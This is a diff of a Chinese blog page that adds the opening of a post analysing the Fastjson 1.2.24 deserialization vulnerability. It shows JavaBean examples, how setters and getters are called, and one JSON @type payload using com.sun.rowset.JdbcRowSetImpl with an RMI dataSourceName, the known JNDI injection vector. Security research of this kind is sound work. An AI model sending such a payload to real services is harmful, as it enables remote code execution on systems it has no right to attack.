@@ -5,7 +5,9 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Fastjson反序列化分析, J1an&#39;s Little World">
-    <meta name="description" content="">
+    <meta name="description" content="在进行fastjson反序列化前，我们要先看看为什么fastjson解析会有反序列化的漏洞，我们先来做一个正常的类，并对其使用json解析，这里我们使用1.2.24版本作为演示
+&amp;lt;dependency&gt;
+    &amp;lt;groupId">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -338,9 +340,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Java/">
+                                <span class="chip bg-color">Java</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -376,7 +382,79 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+                <p>在进行fastjson反序列化前，我们要先看看为什么fastjson解析会有反序列化的漏洞，我们先来做一个正常的类，并对其使用json解析，这里我们使用1.2.24版本作为演示</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先来一个正常一点的用户类（符合JavaBean要求）</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.example;
+public class User &#123;
+    private String username;
+    private String password;
+    public User(String username,String password)&#123;
+        this.username&#x3D;username;
+        this.password&#x3D;password;
+    &#125;
+    public User() &#123;
+    &#125;
+
+    public String getUsername() &#123;
+        System.out.println(&quot;getUsername&quot;);
+        return username;
+    &#125;
+    public void setUsername(String username) &#123;
+        System.out.println(&quot;setUsername&quot;);
+        this.username &#x3D; username;
+    &#125;
+    public String getPassword() &#123;
+        System.out.println(&quot;getPassword&quot;);
+        return password;
+    &#125;
+    public void setPassword(String password) &#123;
+        System.out.println(&quot;setPassword&quot;);
+        this.password &#x3D; password;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>写个test调用一下</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+
+public class test &#123;
+    public static void main(String[] args) &#123;
+        User user&#x3D;new User(&quot;Jlan&quot;,&quot;FXXKpassword&quot;);
+        String json&#x3D; JSON.toJSONString(user);
+        System.out.println(json);
+    &#125;
+&#125;
+&#x2F;&#x2F;getPassword
+&#x2F;&#x2F;getUsername
+&#x2F;&#x2F;&#123;&quot;password&quot;:&quot;FXXKpassword&quot;,&quot;username&quot;:&quot;Jlan&quot;&#125;
+&#x2F;&#x2F;输出结果可见调用了getter方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们再来看三种不同的解析方法会对类做什么处理</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110241070.png"></p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110242083.png"></p>
+<p>可以看到除了我们指定好类的情况下变量为对应的类，剩下的情况都是JSONObject类（废话），那我们在来看看在json中加入@type参数是什么效果</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110247830.png"></p>
+<p>可以看到这次parse方法和指定类的parseObject方法都转换出了正确的类并且调用了setter方法，但是不指定类的parseObject方法却先调用了setter方法后调用了getter方法，这是为什么呢，我们跟入其源码看一下</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public static JSONObject parseObject(String text) &#123;
+    Object obj &#x3D; parse(text);
+    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到其先调用了parse方法（setter被调用），然后判断这个对象是否是JSONObject对象，如果不是就调用toJSON将其转为JSONObject（getter被调用）</p>
+<p>那现在又有一个问题，如果@type和parseObject传入的类不相同怎么办，我们先建立一个和User完全一致的Users类（名字不一样哈）</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110253552.png"></p>
+<p>意料之中，直接报错（大家也可以试试使用Object.class，这是成功的，怀疑是先进行prase再尝试进行转换）</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/badClassName"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h3><p>这就是反序列化的关键类了，我们跟入看看里面的内容</p>
+<h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
                 
             </div>
             <hr/>
@@ -439,7 +517,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/Java/">
+                                    <span class="chip bg-color">Java</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
